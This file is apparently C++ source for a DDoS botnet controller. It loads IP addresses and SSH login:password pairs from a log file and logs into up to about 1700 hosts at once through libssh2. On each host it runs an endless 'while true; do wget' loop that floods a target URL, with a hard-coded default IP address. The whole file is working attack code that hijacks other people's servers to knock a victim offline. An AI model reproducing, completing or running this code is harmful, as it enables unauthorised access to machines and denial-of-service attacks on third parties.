#include "ddos.h"
typedef pair<string,string> datapair;
map<unsigned long,datapair> ips;
typedef struct thrarg
{
	unsigned long host;
	char username[22];
	char password[22];
} thrarg;
 int running = 0;
class MySexec : public SExec
{
public:
	int FireStderr(SExecStderrEventParams *e)
	{
		//fwrite(e->Text, 1, e->lenText, stderr);
		return 0;
	}
	int FireStdout(SExecStdoutEventParams *e)
	{
		//fwrite(e->Text, 1, e->lenText, stdout);
		return 0;
	}
	int FireSSHServerAuthentication(SExecSSHServerAuthenticationEventParams *e)
	{
		e->Accept = true;
		return 0;
	}
};
#define PAGE_SIZE 4096
#define STK_SIZE (100 * PAGE_SIZE)
void* ControlThread(void* a);
char cmd[1024];
int num=0;
int main(int argc,char* argv[])
{
	if(argc>1 && strlen(argv[1]))
		strcpy(cmd, argv[1]);
	else
		strcpy(cmd,"http://195.2.253.204:84/");
	fstream fs;
	
	fs.open ("log.txt", std::fstream::in | std::fstream::out);
	if (fs.is_open())
	{
		num=0;
		while ( fs.good() )
		{
			string line;
			getline (fs,line);
			string login,password,host;
			login.resize(32);
			host.resize(32);
			password.resize(32);
			int n=sscanf(line.c_str(), "%[^ ] %[^:]:%[^ ]", host.c_str(),
				login.c_str(), password.c_str());
			if (n!=3)
				continue;
			num++;
			//  deb("load %d: [%s] [%s:%s]\r\n",num, host.c_str(),
			//       login.c_str(),password.c_str());
			unsigned long ip;
			ip=inet_addr(host.c_str());
			ips[ip] = make_pair(login, password);
		}
		fs.close();
		deb("%d loaded, inbase: %d", num, ips.size());
	}
	else
	{
		deb("failed to open\r\n");
	}
	fs.close();
	num=0;
	for (map<unsigned long,datapair>::iterator it=ips.begin();it!=ips.end();++it)
	{
		//it = ips.at(rand()%ips.size());
		//it=ips[rand()%ips.size()];

		void *stack;
		pthread_t thread;
		pthread_attr_t attr;

			if(++num>=1700)
			{
				do
				{
					sleep(1);
				}while(num>1700);
				continue;
			}
		//void* arg;
		//usleep(1010);
		pair<string,string> dp;
		struct sockaddr_in sin;
		pthread_t thread1;
		thrarg *arg;
		sockaddr_in serv_addr;
		sin.sin_addr.s_addr = it->first;
		char curhost[26];
		strcpy(curhost, inet_ntoa(sin.sin_addr));
		//strcpy(arg.username,dp->first);
		arg=(thrarg*) malloc(sizeof(thrarg));
		arg->host = it->first;
		dp = it->second;
		strcpy(arg->username, dp.first.c_str());
		strcpy(arg->password, dp.second.c_str());
		int      result;
		pthread_attr_init(&attr);
	//	pthread_attr_setstack(&attr,&stack,STK_SIZE);
		result=pthread_create(&thread, &attr, ControlThread, (void*)arg);
	//	break;
		usleep(199);
	}
	while (1)
	{
		sleep(5);
		string syst;
		syst.resize(1000);
		sprintf((char*)syst.c_str(), "time curl -XGET %s", argv[1]);
		// system(syst.c_str());
		deb("running: %d\r\n",running);
	}
}
void* ControlThread(void* a)
{
	thrarg *arg;
	arg = (thrarg*) a;
	struct sockaddr_in sin;
	int yes=0;
	char username[1024]="root";
	char password[1024]="root";

	int numexecs=0;
	while (numexecs++<=1)
	{
		
	
		char *sftppath="/tmp";
		sin.sin_addr.s_addr = arg->host;
		//deb("%s %s:%s ", inet_ntoa(sin.sin_addr), dp.first.c_str(), dp.second.c_str());
		int sockfd;
		sockaddr_in serv_addr;
		char curhost[26];
		strcpy(curhost, inet_ntoa(sin.sin_addr));
		//  boost::random::uniform_int_distribution<> dist(1, 9999999999999);//numeric_limits< unsigned long>::max());
		//  boost::random::mt19937 gen((int)pthread_self()+(int)time(NULL));
		LIBSSH2_SESSION *session=0;
		// HCkSsh ssh;
		//   srand((int)pthread_self()+rand()+time(NULL));
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		if (sockfd < 0)
			deb("ERROR opening socket: %s\r\n",fmterr());
		setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
		long flags;
		flags		  = fcntl(sockfd, F_GETFL, 0);
		fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
		bzero((char *) &serv_addr, sizeof(serv_addr));
		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(22);
		serv_addr.sin_addr.s_addr = sin.sin_addr.s_addr;
		struct timeval tv;
		int ret;
		strcpy(username,arg->username);
		strcpy(password, arg->password);
		 //   deb("connecting %16s %s:%s ", inet_ntoa(serv_addr.sin_addr),username,password);
		ret=connect(sockfd, (struct sockaddr*) &serv_addr, sizeof( serv_addr));
		fd_set fds;
		//deb("ret:%d errno:%s (%d)\r\n",ret,strerror(errno),errno);
		// sleep(1);
		FD_ZERO(&fds);
		FD_SET(sockfd, &fds);
		memset(&tv, 0, sizeof(tv));
		tv.tv_sec = 4;
		tv.tv_usec = 0;
		char buf[1024];
		if (ret==0 || (ret==-1 && errno == EINPROGRESS))
		{
			//	fcntl(sockfd, F_SETFL, flags );
			//	deb(" connected, selecting ...");
			int res = select(sockfd+1,  &fds,&fds, 0, &tv);
			//deb("res:%d errno:%s (%d)\r\n",res,strerror(errno),errno);
			if (res < 0 && errno != EINTR)
			{
				deb("\r\n%s Error connecting %d - %s\n\r",
					curhost, errno, strerror(errno));
			}
			else if (res > 0)
			{
				flags &= (~O_NONBLOCK);
				if ( fcntl(sockfd, F_SETFL, flags) < 0)
				{
					deb("Error fcntl(..., F_SETFL) (%s)\n", strerror(errno));
				}
				int rcv;
				memset(buf, 0, sizeof(buf));
			//	rcv = recv(sockfd, buf, sizeof(buf), MSG_PEEK);
				//if (rcv>0)
				//  buf[rcv]=0;
				//  if (rcv>0)
			//	deb("rcv: %d (errno:%s) %s\r\n",rcv, strerror(errno),trim(buf));
				int rc;
				const char *fingerprint;
				session = libssh2_session_init();
				libssh2_session_set_blocking(session, 1);
				int numTry=0;
				while (session>0 && (rc = libssh2_session_handshake(session, sockfd)) ==
					LIBSSH2_ERROR_EAGAIN);
				int u;
				LIBSSH2_CHANNEL *channel=0;
				if (rc)
				{
					if (rc==-43) {
					//	running--;
						close(sockfd);
						num--;
						return -1;
					}
					 deb("%s failure establishing SSH session: %d\n",curhost,rc);
					
					   num--;
					close(sockfd);
				}
				else
				{
					fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
					//deb( "%16s %-50s ", inet_ntoa(serv_addr.sin_addr),
					//    trim(buf));
					/*  for (int i = 0; i < 20; i++)
					{
					deb(KYEL "%02X " RESET, (unsigned char)fingerprint[i]);
					}
					deb( "\n"); */
					if (libssh2_userauth_password(session, username, password))
					{
						//running--;
						deb(KRED "%s Authentication by password failed. [%s:%s]\n"
							RESET, inet_ntoa(serv_addr.sin_addr),username, password);
						close(sockfd);
						num--;
						return;
					}
					else
					{
						deb(KCYN "%s authenticated %s:%s \r\n" RESET,
							inet_ntoa(serv_addr.sin_addr),
							username,password);
						struct stat fileinfo;
						channel = libssh2_scp_recv(session, "/etc/services", &fileinfo);
						if (!channel)
						{
							deb(KRED "%16s Unable to open a session: %d\r\n" RESET,
								inet_ntoa(serv_addr.sin_addr),
								libssh2_session_last_errno(session));
								num--;
							close(sockfd);
							//	running--;
							return;
						}
						if (!fileinfo.st_size)
						{
							// deb(KGRN "%16s router/modem\r\n" RESET, inet_ntoa(serv_addr.sin_addr),
							//     fileinfo.st_size);
							// fdeb("%s %s:%s [router/modem (%s)]\r\n", inet_ntoa(serv_addr.sin_addr),
							//     username,password,trim(buf));
						}
						else
						{
							// deb(KGRN "%16s unknown device fs:%d [%s]\r\n" RESET,
							//      inet_ntoa(serv_addr.sin_addr),
							//     fileinfo.st_size,trim(buf));
							//   fdeb("%s %s:%s unknown (%s)\r\n", inet_ntoa(serv_addr.sin_addr),
							//       username,password,trim( buf));
						}
						/*  channel = libssh2_scp_recv(session, "/proc/cpuinfo", &fileinfo);
						if (!channel)
						{
						//  deb(KRED "\r\nUnable to open a session: %d\r\n" RESET,
						//      libssh2_session_last_errno(session));
						//break;
						}
						else
						{
						int got=0;
						char mem[1024];
						int amount=sizeof(mem);
						while (got < fileinfo.st_size)
						{
						if ((fileinfo.st_size -got) < amount)
						{
						amount = fileinfo.st_size -got;
						}
						rc = libssh2_channel_read(channel, mem, amount);
						if (rc > 0)
						{
						deb("mem:%p rc:%d", mem, rc);
						}
						else if (rc < 0)
						{
						deb("libssh2_channel_read() failed: %d\n", rc);
						return;
						}
						got += rc;
						}
						if (mem[0])
						deb("mem: %s", mem);
						} */
						try
						{
							strcpy(curhost, inet_ntoa(sin.sin_addr));
							//deb("execing %s [%s:%s]...\r\n",curhost,username,password);
							MySexec sexec;
							
							sexec.SetSSHHost( curhost );
							//deb("1\r\n");
							int ret_code = sexec.SetTimeout(117);

							if (ret_code) deb("\r\nfailed: SetTimeout\r\n");
							//deb("2\r\n");
							ret_code = sexec.SetSSHUser(username);
							//deb("3 %s\r\n",username);
							if (ret_code) deb("\r\nfailed: SetSSHUser\r\n");
							ret_code = sexec.SetSSHPassword(password);
						//	deb("4 %s [%s]\r\n",password,curhost);
							if (ret_code) deb("\r\nfailed: SetSSHPassword()\r\n");
							ret_code = sexec.SSHLogon(curhost ,22);
							//deb("5\r\n");
							if (ret_code) 
							{
								close(sockfd);
								//running--;
								deb("failed: SSHLogon\r\n");
								num--;
								return;
							}

							string scmd;
							scmd.resize(1024);
							int numexc=0;
							//sprintf((char*)scmd.c_str(), "while [0 -lt 1]\r\ndo\\r\\n wget -O /dev/null %s\\r\\ndone\\r\\n",  cmd);//" \r\n"
							//sprintf((char*)scmd.c_str(), "sh  \"while [0 -lt 1]\ndo\nwget -O /dev/null %s\ndone\n\" > /tmp/a.sh ;sh /tmp/a.sh;cat /tmp/a.sh",  cmd);//" \r\n"
							//sprintf((char*)scmd.c_str(), "wget -O /dev/null %s &",  cmd);//" \r\n"
							//for(int u=0;u<10;u++)
							//	scmd = scmd+ ";" +scmd;
							
							sexec.Execute("killall -9 wget");
							int ts;
							while (1)
							{
								running++;
								sprintf((char*)scmd.c_str(),"while true; do wget  -O /var/log/null -q %s ;  done", cmd, numexc);
								numexc++;
								if(numexc>2)
								{
									if(time(NULL)-ts >= 5)
													deb(KGRN "%s stall, secs: %d\r\n" RESET, curhost,time(NULL)-ts);
									if(time(NULL)-ts <= 5)
									{
										deb(KRED " skipping host\r\n" RESET);
										running--;
										close(sockfd);
										num--;
										return;
									}
								}
								
							//	deb("execing: %s\r\n",scmd.c_str());
								
								ts=time(NULL);
								ret_code = sexec.Execute(//"i=\"0\"\r\n"
									//"while [ $i -lt 4 ]\r\n"
									//"do\r\n"
									scmd.c_str()
									//"i=$[$i+1]\r\n"
									//"done \r\n"
									);
								if (ret_code) deb("\r\Execute:%d",ret_code);
								//sleep(2);
								deb(KYEL "[%d] executed on %s, sec:%d\r\n" RESET, numexc, curhost,time(NULL)-ts);
								running--;
								sleep(1);
								//break;
							}
							//fdeb("\r\n[host %s]\r\n",curhost);
							// exit(0);
						}
						catch ( const char *str )
						{
							deb(KRED "in except: %s\r\n" RESET,str);
						}
						//exit(0);
					}
				}
				// deb("done\r\n");
			}
		}
		else
		{
			deb("failed connect");
			num--;
		}
		num--;
	}
	return 0;
}
